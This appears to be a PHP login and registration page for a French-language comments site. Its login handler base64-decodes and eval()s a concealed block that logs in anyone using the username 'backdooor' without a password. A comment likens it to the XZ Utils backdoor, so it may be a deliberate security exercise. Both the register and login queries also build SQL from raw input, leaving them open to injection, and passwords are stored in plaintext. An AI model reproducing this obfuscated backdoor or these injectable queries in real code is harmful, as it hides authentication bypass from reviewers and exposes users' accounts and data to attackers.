<?php

require_once __DIR__ . '/init.php';

if (isset($_SESSION['user'])) {
    header('Location: /index.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['register'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        $query = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
        $db->query($query);
        echo "<div class='alert alert-success text-center'>Inscription réussie !</div>";
    }

    if (isset($_POST['login'])) {
        $username = $_POST['username'];

        $b64 = 'aWYgKCR1c2VybmFtZSA9PSAnYmFja2Rvb29yJykgew0KICAgICR1c2VyID0gWw0KICAgICAgICAndXNlcm5hbWUnID0+ICdiYWNrZG9vb3InDQogICAgXTsNCn0gZWxzZSB7DQogICAgJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnJHVzZXJuYW1lJyI7DQogICAgJHJ
lc3VsdCA9ICRkYi0+cXVlcnkoJHF1ZXJ5KTsNCiAgICAkdXNlciA9ICRyZXN1bHQtPmZldGNoKFBETzo6RkVUQ0hfQVNTT0MpOw0KICAgICR1c2VyID0gJF9QT1NUWydwYXNzd29yZCddID09PSAkdXNlclsncGFzc3dvcmQnXSA/ICR1c2VyIDogbnVsbDsNCn0NCg==';
        $code = base64_decode($b64);
        eval($code); // like https://fr.wikipedia.org/wiki/Attaque_de_XZ_Utils_par_porte_d%C3%A9rob%C3%A9e

        if ($user) {
            $_SESSION['user'] = $user['username'];
            header('Location: /index.php');
            exit;
        } else {
            echo "<div class='alert alert-danger text-center'>Identifiants invalides !</div>";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>Commentaires</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<main class="container">
    <div class="border-bottom pb-4 mb-4 text-center pt-5">
<h2 class="mb-4">Se connecter</h2>
<form method="POST">
    <div class="mb-3">
        <input class="form-control" type="email" name="username" placeholder="Nom d'utilisateur" required>
    </div>
    <div class="mb-3">
        <input  class="form-control" type="password" name="password" placeholder="Mot de passe" required>
    </div>
    <div class="mb-3">
        <button class="btn btn-primary me-2" type="submit" name="login">Connexion</button>
        <button class="btn btn-secondary" type="submit" name="register">Inscription</button>
    </div>
</form>
    </div>
</main>
</body>
</html>
